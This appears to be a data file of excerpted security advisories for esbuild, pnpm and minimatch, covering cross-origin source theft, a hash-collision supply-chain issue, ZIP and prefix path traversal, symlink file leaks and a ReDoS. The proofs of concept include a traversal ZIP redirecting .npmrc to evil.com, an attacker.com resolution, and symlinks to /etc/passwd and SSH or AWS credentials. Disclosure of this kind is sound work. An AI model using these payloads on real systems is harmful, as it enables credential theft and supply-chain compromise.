The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",

Although the real names are under the package name /node_modoules/, there are no version numbers for the libraries they refer to.\n![Schematic picture](https://github.com/user-attachments/assets/7b8b87ab-f297-47bd-a9dd-43be86e36ed2)\nIn the diagram, we assume that two packages are called packageA and packageB, and that the first 90 digits of their package names must be the same, and that the hash value of the package names with versions must be the same.  Then C is the package that they both reference, but with a different version number.  (npm allows package names up to 214 bytes, so constructing such a collision package name is obvious.)\n\nThen hash(packageA@1.2.3)=hash(packageB@3.4.5).  This results in the same path for the installation, and thus under the same directory.  Although the package names under node_modoules are the full paths again, they are shared with C.\nWhat is the exact version number of C?\nIn our local tests, it depends on which one is installed later.  If packageB is installed later, the C version number will change to 2.0.0.  At this time, although package A requires the C@1.0.0 version, package. json will only work during installation, and will not affect the actual operation.\nWe did not receive any installation error issues from pnpm during our local testing, nor did we use force, which is clearly a case that can be triggered.\n\nFor a package with a package name + version number longer than 120, another package can be constructed to introduce an indirect reference to a lower version, such as one with some known vulnerability.\nAlternatively, it is possible to construct two packages with more than 120 package names + version numbers.\nThis is clearly an advantage for those intent on carrying out supply chain attacks.\n\n\nThe solution:\nThe repair cost is also very low, just need to upgrade the md5 function to sha256.",

Unvalidated ZIP Entry Extraction (`fetching/binary-fetcher/src/index.ts`)**\n\nAdmZip's `extractAllTo` does not validate entry paths for path traversal:\n\n```typescript\nconst zip = new AdmZip(buffer)\nconst nodeDir = basename === '' ? targetDir : path.dirname(targetDir)\nconst extractedDir = path.join(nodeDir, basename)\nzip.extractAllTo(nodeDir, true)  // Entry paths not validated!\nawait renameOverwrite(extractedDir, targetDir)\n```\n\nA ZIP entry with path `../../../.npmrc` will be written outside `nodeDir`.\n\n**2. Unvalidated Prefix in BinaryResolution (`resolving/resolver-base/src/index.ts`)**\n\nThe `basename` variable comes from `BinaryResolution.prefix` and is used directly in path construction:\n\n```typescript\nconst extractedDir = path.join(nodeDir, basename)\n// If basename is '../../evil', this points outside nodeDir\n```\n\n### PoC\n\n**Attack Vector 1: ZIP Entry Path Traversal**\n\n```python\nimport zipfile\nimport io\n\nzip_buffer = io.BytesIO()\nwith zipfile.ZipFile(zip_buffer, 'w') as zf:\n    # Normal file\n    zf.writestr('node-v20.0.0-linux-x64/bin/node', b'#!/bin/sh\\necho \"legit node\"')\n    # Malicious path traversal entry\n    zf.writestr('../../../.npmrc', b'registry=https://evil.com/\\n')\n\nwith open('malicious-node.zip', 'wb') as f:\n    f.write(zip_buffer.getvalue())\n```\n\n**Attack Vector 2: Prefix Traversal via malicious resolution:**\n\n```json\n{\n  \"resolution\": {\n    \"type\": \"binary\",\n    \"url\": \"https://attacker.com/node.zip\",\n    \"prefix\": \"../../PWNED\"\n  }\n}\n```\n\n### Impact\n\n- All pnpm users who install packages with binary assets\n- Users who configure custom Node.js binary locations\n- CI/CD pipelines that auto-install binary dependencies\n- Can overwrite config files, scripts, or other sensitive files leading to RCE\n\nVerified on pnpm main @ commit `5a0ed1d45`.",

      "overview": "### Summary\nWhen pnpm installs a `file:` (directory) or `git:` dependency, it follows symlinks and reads their target contents without constraining them to the package root. A malicious package containing a symlink to an absolute path (e.g., `/etc/passwd`, `~/.ssh/id_rsa`) causes pnpm to copy that file's contents into `node_modules`, leaking local data.\n\n**Preconditions:** Only affects `file:` and `git:` dependencies. Registry packages (npm) have symlinks stripped during publish and are NOT affected.\n\n### Details\nThe vulnerability exists in `store/cafs/src/addFilesFromDir.ts`. The code uses `fs.statSync()` and `readFileSync()` which follow symlinks by default:\n\n```typescript\nconst absolutePath = path.join(dirname, relativePath)\nconst stat = fs.statSync(absolutePath)  // Follows symlinks!\nconst buffer = fs.readFileSync(absolutePath)  // Reads symlink TARGET\n```\n\nThere is no check that `absolutePath` resolves to a location inside the package directory.\n\n### PoC\n```bash\n# Create malicious package\nmkdir -p /tmp/evil && cd /tmp/evil\nln -s /etc/passwd leaked-passwd.txt\necho '{\"name\":\"evil\",\"version\":\"1.0.0\",\"files\":[\"*.txt\"]}' > package.json\n\n# Victim installs\nmkdir /tmp/victim && cd /tmp/victim\npnpm init && pnpm add file:../evil\n\n# Leaked!\ncat node_modules/evil/leaked-passwd.txt\n```\n\n### Impact\n- Developers installing local/file dependencies\n- CI/CD pipelines installing git dependencies\n- Credential theft via symlinks to `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_rsa`\n\n### Suggested Fix\nUse `lstatSync` to detect symlinks and reject those pointing outside the package root in `store/cafs/src/addFilesFromDir.ts`.",

      "overview": "### Summary\n`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.\n\nThe time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.\n\n\n### Details\n_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\n### PoC\nWhen minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`:\n\n```\n/^(?!\\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/\n```\n\nWhen the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) ΓÇö exponential.\n### Impact\nAny application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:\n- File search/filter UIs that accept glob patterns\n- `.gitignore`-style filtering with user-defined rules\n- Build tools that accept glob configuration\n- Any API that exposes glob matching to untrusted input",
